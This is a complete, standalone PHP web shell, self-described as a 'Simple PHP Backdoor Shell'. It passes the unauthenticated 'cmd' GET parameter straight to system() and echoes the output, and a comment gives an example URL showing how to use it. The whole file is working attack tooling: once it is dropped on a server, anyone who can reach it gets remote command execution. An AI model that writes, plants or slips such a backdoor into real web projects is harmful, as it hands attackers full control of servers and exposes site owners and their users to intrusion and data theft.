<?php
# Simple PHP Backdoor Shell // http://www.example.com/shell.php?cmd=dir
echo "Running ".$_GET['cmd'];
if( isset($_GET['cmd']) )
{
  echo "<pre>";
  $cmd = ($_GET['cmd']);
  system($cmd);
  echo "</pre>";
  die;
}
else 
{
 echo '?cmd=COMMAND';
}
?> 
